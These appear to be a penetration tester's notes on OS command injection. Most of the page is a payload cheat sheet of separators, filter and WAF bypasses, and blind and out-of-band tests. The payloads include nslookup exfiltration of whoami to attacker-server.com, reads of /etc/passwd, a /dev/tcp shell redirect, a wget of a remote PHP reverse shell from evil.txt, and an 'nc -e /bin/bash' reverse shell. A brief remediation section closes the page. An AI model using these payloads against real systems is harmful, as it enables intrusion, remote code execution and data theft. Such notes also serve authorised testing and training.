# Command Injection

[OWASP](https://owasp.org/www-community/attacks/Command_Injection) states: *"Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation."* [Portswigger](https://portswigger.net/web-security/os-command-injection) also states two variants on the naming convention: *OS command injection is also known as shell injection*.

When a web application makes a call to a function that interacts with the server's console directly.

#### Typology 


```bash
url/ENDPOINT?PARAMETRE=;ls+-la+/ 
PARAMETRE=&type+C:\Windows\System32\drivers\etc\hosts  
```

1. Blind - no direct output from the application when testing payloads
2. Verbose - direct output from the application when testing payloads

OOB (Out Of Band) Exploitation
```bash
& nslookup attacker-server.com &
& nslookup `whoami`.attacker-server.com &
```

Make the remote server sleep for blind PoC  
```bash
sleep 5
```


#### Useful Commands

If your scope allows for connecting back to a box you control
```bash
# If 10.10.10.10 was your controlled box
ping -c 3 10.10.10.10
# Controlled box, substitue flags for like: -i $interface, etc
sudo tcpdump $flags icmp
```

Linux
```bash
whoami
uname -a
ifconfig
netstat -ano
ps -ef
```
Windows
```powershell
whoami
ver
ipconfig /all
netstat -ano
tasklist
```

#### Special Characters 

If `&` as injection character and require an unbroken (that the application intended functionality is not tampered with other than inserting an additional malicious command in between two parameters) command injection try: `& whoami &`

```powershell
# Linux and Windows Host
# From HackTricks - Important: consider whitespace placement!
# Beware whitespace filtering!
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2ยบ if 1ยบ finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2ยบ
ls %0A id # %0A Execute both (RECOMMENDED)

& %26
&& %26%26
| 
||
%0A
# Linux
;
\n # or 0x0a
# $ or ` to perform inline execution of an injected command
command ` # injected command is `
$( # injected command is )

ls${LS_COLORS:10:1}${IFS}id # Might be useful

# Redirection of output
> /var/www/html/out.txt 
< /etc/passwd 

```

Is Dos or PowerShell executing the command injection payload?
```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

#### Bypasses

`%2F` is URL encoded forward slash. `&` and `&&` to make additional commands to the payload that simply a one liner injected into a website. Consider review both [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)and [HackTricks: Bypass-bash-restrictions](https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/useful-linux-commands/bypass-bash-restrictions.md) for Bypasses

A Windows Filtering bypass been:
```powershell
# Wildcard Windows bypass
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```

Bash Bypass without whitespace
```bash
# $IFS is the Internal Field Separator variable - it contains whitespace characters
cat$IFS/etc/passwd
# Brace expansion to generate arbitrary strings
{cat,/etc/passwd}
# Input redirection without whitespace as `>` and `<` do not require them  
cat</etc/passwd
sh</dev/tcp/127.0.0.1/4242
# ANSI-C Quoting
X=$'uname\x20-a'&&$X
# Use the ASCII tab character: hex 09
;ls%09-al%09/home
```

Window substitute white space 
```powershell
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
```

Bash Bypassing Character filters for `\` and `/` from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
```bash
# Each returns a /
echo ${HOME:0:1}
echo . | tr '!-0' '"-1'
tr '!-0' '"-1' <<< .


cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
# returns: root:x:0:0:root:/root:/bin/bash

# Backslah newline 
$ cat /et\
c/pa\
sswd
# URL encoded:
cat%20/et%5C%0Ac/pa%5C%0Asswd

```

Bash Bypassing Blacklisted Words from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
```bash
w'h'o'am'i
w"h"o"am"i
w\ho\am\i
/\b\i\n/////s\h
who$@ami
echo whoami|$0
who$()ami
who$(echo am)i
who`echo am`i
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

WAF bypasses from [cobalt.io](https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection)
```bash
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
/tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
```
#### Exfiltration Via other means

For data exfiltration via DNS use: [dnsbin](https://github.com/HoLyVieR/dnsbin) - [[Data-Exfiltration-Over-DNS]]

#### Remediation and Prevention

1. Replace vulnerable functions interacting with OS - Avoid using shell execution functions
2. Sanitise and Filtering Input - [Portswigger](https://portswigger.net/web-security/os-command-injection):
	- Validating against a whitelist of permitted values.
	- Validating that the input is a number.
	- Validating that the input contains only alphanumeric characters, no other syntax or whitespace characters.
3. The user data should be strictly validated. Ideally with a whitelist. - [Portswigger issues 00100100](https://portswigger.net/kb/issues/00100100_os-command-injection)
4. The application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection - [Portswigger issues 00100100](https://portswigger.net/kb/issues/00100100_os-command-injection)
## References

[Portswigger](https://portswigger.net/web-security/os-command-injection)
[TryHackMe Room](https://tryhackme.com/room/oscommandinjection)
[OWASP](https://owasp.org/www-community/attacks/Command_Injection)
[Portswigger issues 00100100](https://portswigger.net/kb/issues/00100100_os-command-injection)
[THM OWASP Top 10 2021 Room](https://tryhackme.com/room/owasptop102021)
[Github - Hacktricks](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/command-injection.md)
[For bypassess HackTricks: Bypass-bash-restrictions](https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/useful-linux-commands/bypass-bash-restrictions.md)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
[Busra Demir's cobalt.io CMDi Article](https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection)